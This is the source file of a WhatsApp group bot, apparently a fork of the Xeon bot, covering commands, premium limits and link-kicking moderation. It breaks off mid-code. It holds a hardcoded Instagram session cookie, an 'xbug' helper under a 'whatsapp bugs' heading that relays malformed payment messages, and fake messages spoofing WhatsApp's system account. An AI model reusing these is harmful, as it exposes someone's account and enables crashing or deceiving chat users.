/**
༺❤️༒🦁PRAMESH LION BOT🦁༒❤️༻
**/



require('./settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, Mimetype, generateWAMessage, prepareWAMessageMedia, prepareMessageFromContent,  areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const os = require('os')
const util = require('util')
const path = require('path')
const axios = require('axios')
const chalk = require('chalk')
const crypto = require('crypto')
const yts = require('youtube-yts')
const xfar = require('xfarr-api')
const request = require('request')
const xeontod = require("tod-api")
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const thiccysapi = require('textmaker-thiccy')
const QrCode = require('qrcode-reader')
const qrcode = require('qrcode')
const { buffergif } = require('./lib/myfunc2')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const google = require('google-it')
const { exec, spawn, execSync } = require("child_process")
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { jadibot, listJadibot } = require('./lib/rentbot')
const { performance } = require('perf_hooks')
const { igApi, getSessionId } = require('insta-fetcher');
let ig = new igApi("csrftoken=6wrPrUbsa05Csm9wlqxAOSqRwxxscjD;rur=16771\05427758921939\0541695476019:01f7994241f5e244ccf1bb676853d91b4f281e385e564f6c99a3592b27b0a39dada825e8;mid=Yy21jQALAAEmUl5E0beHHz_eVvyI;ds_user_id=27758921939;sessionid=27758921939%3ASGdS1WkMZToRfs%3A12%3AAYe5Sp23sp78pv0PnIRL6X-ySJdCDpe4uxbuJxtcxw;ig_did=09B76BA7-2D56-42E5-89BB-3584A9EAD69B");
ig.setCookie("csrftoken=6wrPrUbsa05Csm9wlqxAOSqRwxxscjD;rur=16771\05427758921939\0541695476019:01f7994241f5e244ccf1bb676853d91b4f281e385e564f6c99a3592b27b0a39dada825e8;mid=Yy21jQALAAEmUl5E0beHHz_eVvyI;ds_user_id=27758921939;sessionid=27758921939%3ASGdS1WkMZToRfs%3A12%3AAYe5Sp23sp78pv0PnIRL6X-ySJdCDpe4uxbuJxtcxw;ig_did=09B76BA7-2D56-42E5-89BB-3584A9EAD69B");
const maker = require('mumaker')
const textpro = require('./lib/textpro')
const { fetchBuffer } = require("./lib/myfunc2")
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const ini_mark = `0@s.whatsapp.net`
const ownernya = ownernomer + '@s.whatsapp.net'



//TIME
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
 if(time2 < "18:00:00"){
var ucapanWaktu = `~*සුබ රාත්‍රියක්*~🌌`
 }
 if(time2 < "16:00:00"){
var ucapanWaktu = `~*උබ සවසක්*~🌃`
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = `~*සුබ සවසක්*~🌃`
 }
 if(time2 < "12:00:00"){
var ucapanWaktu = `~*සුබ සන්ද්‍යාවක්*~ 🌅`
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = `~*සුබ උදෑසනක්*~ 🌄`
 }
 if(time2 < "00:00:01"){
var ucapanWaktu = `~*සුබ උදෑසනක්*~🌄`
 } 
//inbox block
//💝💝💝💝💝💝💝\\
// read database game
let tebaklagu = db.data.game.tebaklagu = []
let kuismath = db.data.game.math = []
let vote = db.data.others.vote = []

//read database jid
let premium = JSON.parse(fs.readFileSync('./database/user/premium.json'));
let banned = JSON.parse(fs.readFileSync('./database/user/banned.json'));
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'));
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'));
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'));
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'));
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'));
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'));
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'));
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'));
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'));
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'));
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'));
let bad = JSON.parse(fs.readFileSync('./src/toxic/bad.json'));
let autorep =JSON.parse(fs.readFileSync('./database/autoreply.json'));

//database virus and whatsapp bugs
//warrrrrrrrr

//database auto reply
let xeonysticker = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/sticker.json'));
let xeonyaudio = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/audio.json'));
let xeonyimage = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/image.json'));
let xeonyvideo = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/video.json'));

module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
    try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°${themeemoji}π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const sender = m.isGroup ? (mek.key.participant ? mek.key.participant : mek.participant) : mek.key.remoteJid
const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
const type = Object.keys(mek.message)[0]  
const from = mek.key.remoteJid      
const content = JSON.stringify(mek.message)

	    const cekUser = (users, id) => {     
var cek = null
Object.keys(user).forEach((i) => { 
if (user[i].id === id){ cek = i } })
if (cek !== null){ 
if (users == "id"){ return user[cek].id }
if (users == "emote"){ return user[cek].emote }
if (users == "timers"){ return user[cek].timers }
if (users == "hit"){ return user[cek].hit }
if (users == "star"){ return user[cek].star }
if (users == "alasan"){ return user[cek].alasan }
if (users == "ban"){ return user[cek].ban }
if (users == "premium"){ return user[cek].premium }
}
if (cek == null) return null
}
	
	         //media detect \\
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
     
        //hijack function
        const ordermessage = (m.msg.xtype === 'conversation' && m.msg.message.conversation) ? m.msg.message.conversation : (m.msg.xtype == 'imageMessage') && m.msg.message.imageMessage.caption ? m.msg.message.imageMessage.caption : (m.msg.xtype == 'videoMessage') && m.msg.message.videoMessage.caption ? m.msg.message.videoMessage.caption : (m.msg.xtype == 'extendedTextMessage') && m.msg.message.extendedTextMessage.text.startsWith(prefix) ? m.msg.message.extendedTextMessage.text : (m.msg.xtype == 'buttonsResponseMessage') && m.msg.message.buttonsResponseMessage.selectedButtonId.startsWith(prefix) ? m.msg.message.buttonsResponseMessage.selectedButtonId : (m.msg.xtype == 'listResponseMessage') && m.msg.message.listResponseMessage.singleSelectReply.selectedRowId.startsWith(prefix) ? m.msg.message.listResponseMessage.singleSelectReply.selectedRowId : (m.msg.xtype == 'templateButtonReplyMessage') && m.msg.message.templateButtonReplyMessage.selectedId.startsWith(prefix) ? m.msg.message.templateButtonReplyMessage.selectedId : ''   
        const order = ordermessage.slice(0).trim().split(/ +/).shift().toLowerCase()	   
	 
	
	    //Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
		
// Group
        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
	    const isBan = banned.includes(m.sender)
        const isPremium = premium.includes(m.sender)
        const Autoreply = m.isGroup ? autorep.includes(from) : false
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : false
        const solot = [
		'🍊 : 🍒 : 🍐',
		'🍒 : 🔔 : 🍊',
		'🍇 : 🍇 : 🍇',
		'🍊 : 🍋 : 🔔',
		'🔔 : 🍒 : 🍐',
		'🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',		
		'🍐 : 🍒 : 🍋',
		'🍐 : 🍐 : 🍐',
		'🍊 : 🍒 : 🍒',
		'🔔 : 🔔 : 🍇',
		'🍌 : 🍒 : 🔔',
		'🍐 : 🔔 : 🔔',
		'🍊 : 🍋 : 🍒',
		'🍋 : 🍋 : 🍌',
		'🔔 : 🔔 : 🍇',
		'🔔 : 🍐 : 🍇',
		'🔔 : 🔔 : 🔔  Win',
		'🍒 : 🍒 : 🍒 Win',
		'🍌 : 🍌 : 🍌 Lose'
		]

//afk and other
try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
            
    let chats = global.db.data.chats[m.chat]
    if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
    if (chats) {
if (!('mute' in chats)) chats.mute = false
if (!('antilink' in chats)) chats.antilink = false
    } else global.db.data.chats[m.chat] = {
mute: false,
antilink: false,
    }
    
    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false	
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
//function leveling & pick
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

// Public & Self
if (!XeonBotInc.public) {
    if (!m.key.fromMe) return
}
function randomNomor(angka){
return Math.floor(Math.random() * angka) + 1
}
const hsjdh = randomNomor(5)

//auto react all message
XeonBotInc.sendMessage(m.chat, {
        react: {
            text: `${pickRandom(['❤️','😅','🦁','😳','😎', '🥵', '😱', '💚', '🙄', '🐤','🦁','💝','🤨','🥴','😐','👆','😔', '👀','👎'])}`,
           key: m.key,
          }})

//auto recording all
    if (global.autoRecord) { if (m.chat) { XeonBotInc.sendPresenceUpdate('recording', m.chat) }
}
//autotyper all
  if (global.autoTyping) { if (m.chat) { XeonBotInc.sendPresenceUpdate('composing', m.chat) }
}

// total hit
        global.hit = {}
if (isCmd) {
data = await fetchJson('https://api.countapi.xyz/hit/XeonBotInc-md/visits')
jumlahcmd = `${data.value}`
dataa = await fetchJson(`https://api.countapi.xyz/hit/XeonBotInc-md${moment.tz('Asia/Kolkata').format('DDMMYYYY')}/visits`)
jumlahharian = `${dataa.value}`
}

//premium
const prem1 = `Hi bro  ${pushname} ${ucapanWaktu} \n\nThis feature is for premium members only, please buy premium to use this feature`
const prem2 = `Click the button below to buy premium`
const prem3 = [{buttonId: `${prefix}buypreim`,buttonText: {displayText: `BUY PREMIUM`,},type: 1,},]
blomdaftar = `${ucapanWaktu} @${sender.split("@")[0]} Kamu belum terdaftar di database cek private message mu untuk mendaftar`
limitabis = `*[YOUR LIMIT IS EXPIRED]*\nBuy limit in ${prefix}buylimit or buy premium to get unlimited limit`

//WARRRRRRR
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false
}}}
const xbug = (teks) => {
  XeonBotInc.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
//-------------------End--------------------\\
//Dont edit ot recode or bug wont work

const fmedia =  {
  key : {
    fromMe: false,
participant : '0@s.whatsapp.net'
},
     contextInfo: {
    forwardingScore: 9999,
    isForwarded: false, //:'v
showAdAttribution: true,
title: botname,
mediaType: "VIDEO",
mediaUrl: websitex,
previewType: "PHOTO",
thumbnail: thumb,
sourceUrl: "",
detectLinks: false,
    }}
    
    //reply fake
	//group target \\
const reply = (teks) => {
           XeonBotInc.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
        }

	//button
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const butonna = {
text: text1,
footer: desc1,
buttons: but,
headerType: 1
}
XeonBotInc.sendMessage(id, butonna, options)
}
const http = randomNomor(500)

//document
const kontol = {
	key : {
   participant : '0@s.whatsapp.net'
},
       message: {
    documentMessage: {
    title: `${pushname}`, 
    jpegThumbnail: thumb
  }
}
      }
sendMenuDoc = async (ID, doc, fileName, fileLength, caption, footer, time, buttons, boddy, thumbnail, thumbnailUrl, sourceUrl, mediaUrl, options) => {
let buttonMessage = {
  document: doc,
  mimetype: "application/pdf",
  fileName: fileName,
  fileLength: fileLength,
  caption: caption,
  footer: footer,
  buttons: buttons,
  headerType: 4,
  contextInfo:{externalAdReply:{
     title: time,
     body: boddy,
     thumbnail: thumbnail,
     thumbnailUrl: thumbnailUrl,
     sourceUrl: sourceUrl,
     mediaUrl: mediaUrl,  
     renderLargerThumbnail: true,
     showAdAttribution: true,
     mediaType: 1
   }}
       }
   XeonBotInc.sendMessage(m.chat, buttonMessage, options)
   }
                
        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await XeonBotInc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await XeonBotInc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
        // Anti Link
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return m.reply(`${mess.botAdmin}, to kick the person who send link`)
        let gclink = (`https://chat.whatsapp.com/`+await XeonBotInc.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`})
        if (isAdmins) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`})
        if (isCreator) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nOwner has sent a link, owner is free to post any link`})
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			XeonBotInc.sendMessage(from, {text:`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending group link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }
        
          // Antiwame by xeon
  if (antiWame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antivirtex by xeon
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return m.reply(mess.botAdmin)
          await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			XeonBotInc.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by xeon
if (antiToxic)
if (bad.includes(messagesD)) {
tos = ['Hey, watch your mouth','Never been taught how to speak?','Stop being toxic my friend🤢','Dont be toxic🦄']
sin =  tos[Math.floor(Math.random() * (tos.length))]
m.reply(sin)
if (m.text) {
bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin that's why i won't kick you😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
}
//antilink youtube video by xeon
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by xeon
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by xeon
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by xeon
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
XeonBotInc.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by xeon
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
